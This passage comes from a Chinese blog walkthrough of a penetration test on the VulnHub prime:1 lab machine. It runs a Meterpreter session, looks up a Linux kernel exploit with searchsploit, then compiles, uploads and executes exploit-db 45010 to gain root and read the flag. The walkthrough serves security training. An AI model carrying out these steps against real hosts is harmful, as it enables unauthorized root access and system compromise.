<span class="token number">100644</span>/rw-r--r--  <span class="token number">1344</span>    fil   <span class="token number">2018</span>-12-14 05:33:42 <span class="token parameter variable">-0500</span>  search.php
<span class="token number">100777</span>/rwxrwxrwx  <span class="token number">1111</span>    fil   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:32:55 <span class="token parameter variable">-0400</span>  secret.php
<span class="token number">100644</span>/rw-r--r--  <span class="token number">1785</span>    fil   <span class="token number">2018</span>-12-19 06:24:12 <span class="token parameter variable">-0500</span>  single.php
<span class="token number">100644</span>/rw-r--r--  <span class="token number">159</span>     fil   <span class="token number">2019</span>-01-18 <span class="token number">21</span>:38:50 <span class="token parameter variable">-0500</span>  style-editor-customizer.css
<span class="token number">100644</span>/rw-r--r--  <span class="token number">158</span>     fil   <span class="token number">2019</span>-01-18 <span class="token number">21</span>:38:50 <span class="token parameter variable">-0500</span>  style-editor-customizer.scss
<span class="token number">100644</span>/rw-r--r--  <span class="token number">64981</span>   fil   <span class="token number">2019</span>-02-13 <span class="token number">21</span>:40:50 <span class="token parameter variable">-0500</span>  style-editor.css
<span class="token number">100644</span>/rw-r--r--  <span class="token number">12830</span>   fil   <span class="token number">2019</span>-02-13 <span class="token number">21</span>:40:50 <span class="token parameter variable">-0500</span>  style-editor.scss
<span class="token number">100644</span>/rw-r--r--  <span class="token number">212651</span>  fil   <span class="token number">2019</span>-05-07 <span class="token number">22</span>:06:56 <span class="token parameter variable">-0400</span>  style-rtl.css
<span class="token number">100644</span>/rw-r--r--  <span class="token number">212849</span>  fil   <span class="token number">2019</span>-05-07 <span class="token number">22</span>:06:56 <span class="token parameter variable">-0400</span>  style.css
<span class="token number">100644</span>/rw-r--r--  <span class="token number">2798</span>    fil   <span class="token number">2019</span>-05-07 <span class="token number">22</span>:06:56 <span class="token parameter variable">-0400</span>  style.scss
040755/rwxr-xr-x  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2019</span>-06-18 <span class="token number">20</span>:50:52 <span class="token parameter variable">-0400</span>  template-parts

meterpreter <span class="token operator">&gt;</span> 

</code></pre> 
<blockquote> 
 <p>即将进行系统漏洞提权。<br> 系统信息：<strong>Linux ubuntu 4.10.0-28-generic</strong></p> 
</blockquote> 
<h3><a id="33_Linux_909"></a>3.3 Linux内核漏洞提权</h3> 
<h4><a id="331__910"></a>3.3.1 漏洞查找</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># searchsploit -w ubuntu 4.10.0-28</span>
--------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                 <span class="token operator">|</span>  URL
--------------------------------------------------------------------------------------------------------------- --------------------------------------------
Linux Kernel <span class="token number">4.10</span>.5 / <span class="token operator">&lt;</span> <span class="token number">4.14</span>.3 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> - DCCP Socket Use-After-Free                                           <span class="token operator">|</span> https://www.exploit-db.com/exploits/43234
Linux Kernel <span class="token operator">&lt;</span> <span class="token number">4.13</span>.9 <span class="token punctuation">(</span>Ubuntu <span class="token number">16.04</span> / Fedora <span class="token number">27</span><span class="token punctuation">)</span> - Local Privilege Escalation                                  <span class="token operator">|</span> https://www.exploit-db.com/exploits/45010
Ubuntu <span class="token operator">&lt;</span> <span class="token number">15.10</span> - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                         <span class="token operator">|</span> https://www.exploit-db.com/exploits/41760
--------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
--------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Paper Title                                                                                                   <span class="token operator">|</span>  URL
--------------------------------------------------------------------------------------------------------------- --------------------------------------------
Debian <span class="token operator">&lt;</span> <span class="token number">5.0</span>.6 / Ubuntu <span class="token operator">&lt;</span> <span class="token number">10.04</span> - Webshell Remote Root Exploit                                                 <span class="token operator">|</span> https://www.exploit-db.com/papers/15311
--------------------------------------------------------------------------------------------------------------- --------------------------------------------
                                                                                                                                                            
</code></pre> 
<blockquote> 
 <p>发现这个漏洞可以利用：<br> <a href="https://www.exploit-db.com/exploits/45010" rel="nofollow">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation</a></p> 
</blockquote> 
<pre><code class="prism language-bash">──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># searchsploit ubuntu 4.10.0-28 </span>
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  <span class="token operator">|</span>  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel <span class="token number">4.10</span>.5 / <span class="token operator">&lt;</span> <span class="token number">4.14</span>.3 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> - DCCP Socket Use-After-Free                                                                            <span class="token operator">|</span> linux/dos/43234.c
Linux Kernel <span class="token operator">&lt;</span> <span class="token number">4.13</span>.9 <span class="token punctuation">(</span>Ubuntu <span class="token number">16.04</span> / Fedora <span class="token number">27</span><span class="token punctuation">)</span> - Local Privilege Escalation                                                                   <span class="token operator">|</span> linux/local/45010.c
Ubuntu <span class="token operator">&lt;</span> <span class="token number">15.10</span> - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                          <span class="token operator">|</span> linux/local/41760.txt
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Paper Title                                                                                                                                    <span class="token operator">|</span>  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Debian <span class="token operator">&lt;</span> <span class="token number">5.0</span>.6 / Ubuntu <span class="token operator">&lt;</span> <span class="token number">10.04</span> - Webshell Remote Root Exploit                                                                                  <span class="token operator">|</span> english/15311-debian--5.0.6--ubu
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
                                                                                                                                                                                  

┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># find / -name 45010.c         </span>
find: ‘/run/user/1000/gvfs’: Permission denied
find: ‘/run/user/130/gvfs’: Permission denied
/root/45010.c
/usr/share/exploitdb/exploits/linux/local/45010.c
                                                      
</code></pre> 
<blockquote> 
 <p>获得poc路径：<br> /usr/share/exploitdb/exploits/linux/local/45010.c</p> 
</blockquote> 
<h4><a id="332_poc_964"></a>3.3.2 复制poc</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># cp /usr/share/exploitdb/exploits/linux/local/45010.c ./</span>
                                                                                                                                                                                  
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># ls</span>
<span class="token number">45010</span>.c  shell.php

</code></pre> 
<h4><a id="333_poc_975"></a>3.3.3 编译poc文件</h4> 
<p>参考<a href="https://www.exploit-db.com/exploits/45010" rel="nofollow">cve-2017-16995官方文档</a>执行编译。</p> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># gcc 45010.c -o 45010 -static</span>
                                                                                                                                                                                  
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/prime1<span class="token punctuation">]</span>
└─<span class="token comment"># ls</span>
<span class="token number">45010</span>  <span class="token number">45010</span>.c  shell.php
                                                                                                                                                                                  
</code></pre> 
<h4><a id="334_poc_988"></a>3.3.4 上传编译poc</h4> 
<pre><code class="prism language-bash">meterpreter <span class="token operator">&gt;</span> upload /home/kali/prime1/45010 /tmp/45010
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading  <span class="token builtin class-name">:</span> /home/kali/prime1/45010 -<span class="token operator">&gt;</span> /tmp/45010
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploaded <span class="token parameter variable">-1.00</span> B of <span class="token number">752.41</span> KiB <span class="token punctuation">(</span><span class="token number">0.0</span>%<span class="token punctuation">)</span>: /home/kali/prime1/45010 -<span class="token operator">&gt;</span> /tmp/45010
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Completed  <span class="token builtin class-name">:</span> /home/kali/prime1/45010 -<span class="token operator">&gt;</span> /tmp/45010
meterpreter <span class="token operator">&gt;</span> <span class="token builtin class-name">cd</span> /tmp
meterpreter <span class="token operator">&gt;</span> <span class="token function">ls</span>
Listing: /tmp
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  .ICE-unix
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  .Test-unix
<span class="token number">100444</span>/r--r--r--  <span class="token number">11</span>      fil   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:17 <span class="token parameter variable">-0400</span>  .X0-lock
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:17 <span class="token parameter variable">-0400</span>  .X11-unix
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  .XIM-unix
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  .font-unix
<span class="token number">100644</span>/rw-r--r--  <span class="token number">770472</span>  fil   <span class="token number">2024</span>-06-05 <span class="token number">11</span>:10:37 <span class="token parameter variable">-0400</span>  <span class="token number">45010</span>
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  VMwareDnD
040700/rwx------  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:28 <span class="token parameter variable">-0400</span>  systemd-private-7d99593754664a1a84c9bcbf4d955b30-colord.service-IA7clY
040700/rwx------  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:24 <span class="token parameter variable">-0400</span>  systemd-private-7d99593754664a1a84c9bcbf4d955b30-rtkit-daemon.service-KTk3vv
040700/rwx------  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  systemd-private-7d99593754664a1a84c9bcbf4d955b30-systemd-timesyncd.service-bXOvLg
040700/rwx------  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:13 <span class="token parameter variable">-0400</span>  vmware-root

</code></pre> 
<blockquote> 
 <p>日志显示已经成功上传。</p> 
</blockquote> 
<h4><a id="335_poc_1019"></a>3.3.5 执行编译poc</h4> 
<h5><a id="3351__1020"></a>3.3.5.1 目录切换</h5> 
<pre><code class="prism language-bash">meterpreter <span class="token operator">&gt;</span> <span class="token builtin class-name">cd</span> /tmp
</code></pre> 
<h5><a id="3352__1025"></a>3.3.5.2 赋予可执行权限</h5> 
<pre><code class="prism language-bash">meterpreter <span class="token operator">&gt;</span> <span class="token function">chmod</span> +x <span class="token number">45010</span>
meterpreter <span class="token operator">&gt;</span> <span class="token function">ls</span>
Listing: /tmp
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  .ICE-unix
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  .Test-unix
<span class="token number">100444</span>/r--r--r--  <span class="token number">11</span>      fil   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:17 <span class="token parameter variable">-0400</span>  .X0-lock
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:17 <span class="token parameter variable">-0400</span>  .X11-unix
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  .XIM-unix
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  .font-unix
<span class="token number">100000</span>/---------  <span class="token number">770472</span>  fil   <span class="token number">2024</span>-06-05 <span class="token number">11</span>:10:37 <span class="token parameter variable">-0400</span>  <span class="token number">45010</span>
041777/rwxrwxrwx  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  VMwareDnD
040700/rwx------  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:28 <span class="token parameter variable">-0400</span>  systemd-private-7d99593754664a1a84c9bcbf4d955b30-colord.service-IA7clY
040700/rwx------  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:24 <span class="token parameter variable">-0400</span>  systemd-private-7d99593754664a1a84c9bcbf4d955b30-rtkit-daemon.service-KTk3vv
040700/rwx------  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:11 <span class="token parameter variable">-0400</span>  systemd-private-7d99593754664a1a84c9bcbf4d955b30-systemd-timesyncd.service-bXOvLg
040700/rwx------  <span class="token number">4096</span>    <span class="token function">dir</span>   <span class="token number">2024</span>-06-05 <span class="token number">10</span>:08:13 <span class="token parameter variable">-0400</span>  vmware-root

</code></pre> 
<h5><a id="3353__1049"></a>3.3.5.3 执行编译文件</h5> 
<pre><code class="prism language-bash">meterpreter <span class="token operator">&gt;</span> shell
Process <span class="token number">6025</span> created.
Channel <span class="token number">2</span> created.
<span class="token function">ls</span>
<span class="token number">45010</span>
VMwareDnD
systemd-private-7d99593754664a1a84c9bcbf4d955b30-colord.service-IA7clY
systemd-private-7d99593754664a1a84c9bcbf4d955b30-rtkit-daemon.service-KTk3vv
systemd-private-7d99593754664a1a84c9bcbf4d955b30-systemd-timesyncd.service-bXOvLg
vmware-root
./45010
<span class="token function">whoami</span>
root
<span class="token function">find</span> / <span class="token parameter variable">-name</span> *root*
/tmp/vmware-root
find: <span class="token string">'/run/user/108/gvfs'</span><span class="token builtin class-name">:</span> Permission denied
<span class="token builtin class-name">cd</span> /root
<span class="token function">ls</span>
enc
enc.cpp
enc.txt
key.txt
root.txt
sql.py
t.sh
wfuzz
wordpress.sql
<span class="token function">cat</span> root.txt
b2b17036da1de94cfb024540a8e7075a
</code></pre> 
<blockquote> 
 <p>获得flag:<br> <strong>b2b17036da1de94cfb024540a8e7075a</strong></p> 
</blockquote> 
<hr> 
<h2><a id="_1087"></a>渗透总结</h2> 
<p>在本次prime:1靶机渗透测试，内容包括主机扫描（nmap\netdiscover）、端口扫描（nmap\masscan）、目录扫描（dirb\dirsearch）、wfuzz爆破、wpscan、msf、netcat、反弹shell、linux内核提权，并获得flag等内容：</p> 
<ul><li>使用nmap进行主机发现和端口扫描</li><li>使用dirbsearch进行目录扫描</li><li>网页分析，进行wfuzz爆破参数和值</li><li>netcat监听</li><li>反弹shell</li><li>linux内核提权,获得flag</li></ul> 
<hr> 
<h2><a id="_1097"></a>参考文章</h2> 
<ul><li><a href="https://www.vulnhub.com/entry/prime-1,358/" rel="nofollow">prime:1靶场</a></li><li><a href="https://blog.csdn.net/newbeixue/article/details/123111543">arp-scan使用</a></li><li><a href="https://blog.csdn.net/weixin_45329009/article/details/100170779">Netdiscover基本使用</a></li><li><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap详细使用教程</a></li><li><a href="https://zhuanlan.zhihu.com/p/396345123" rel="nofollow">黑客工具之whatweb详细使用教程</a></li><li><a href="https://github.com/maurosoria/dirsearch">dirsearch - Web path discovery</a></li><li><a href="https://cloud.tencent.com/developer/article/1853795" rel="nofollow">Netcat - 你需要知道的一切</a></li><li><a href="https://www.exploit-db.com/exploits/45010" rel="nofollow">cve-2017-16995</a></li><li><a href="https://blog.csdn.net/whatday/article/details/102806149">searchsploit漏洞查找工具使用指南(exploit-db.com 离线工具 exploitdb)</a></li><li><a href="https://blog.csdn.net/JBlock/article/details/88619117">WFUZZ使用教程</a></li><li>prime-1渗透测试流程图</li></ul>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/fffad75c60f39e30c49e3a2c9450c370/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">vue基础知识点</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/d6828657eb04521bfd6f85b3c2931eb1/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">【数据结构】筛选法建堆</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>